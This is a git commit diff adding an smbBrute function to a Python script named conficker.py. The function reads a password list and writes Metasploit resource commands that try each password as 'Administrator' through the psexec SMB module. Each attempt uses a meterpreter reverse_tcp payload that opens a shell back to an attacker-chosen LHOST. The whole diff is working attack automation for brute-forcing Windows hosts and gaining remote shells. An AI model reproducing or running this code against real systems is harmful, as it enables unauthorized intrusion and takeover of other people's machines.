1bf9ad537d3ce9a5db9b226830390bf67337a0c2
root <ninijay93@gmail.com>
2017-11-01 23:43:22 +0100

    Implemented smbBrute to conficker.py

--- metasploit/conficker.py
+++ metasploit/conficker.py
@@ -1,3 +1,6 @@
+import os
+import optparse
+import sys
 import nmap
 def findTgts(subNet):
     nmScan = nmap.PortScanner()
@@ -24,3 +27,17 @@ def confickerExploit(configFile, tgtHost, lhost, lport):
     configFile.write('set LPORT ' + str(lport) + '\n')
     configFile.write('set LHOST ' + lhost + '\n')
     configFile.write('exploit -j -z\n')
+def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
+    username = 'Administrator'
+    pF = open(passwdFile, 'r')
+    for password in pF.readlines():
+        password = password.strip('\n').strip('\r')
+        configFile.write('use exploit/windows/smb/psexec\n')
+        configFile.write('set  SMBUser ' + str(username) + '\n')
+        configFile.write('set SMBPass ' + str(password) + '\n')
+        configFile.write('set RHOST ' + str(tgtHost) + '\n')
+        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
+        configFile.write('set LPORT ' + str(lport) + '\n')
+        configFile.write('set LHOST ' + lhost + '\n')
+        configFile.write('exploit -j -z\n')
+        
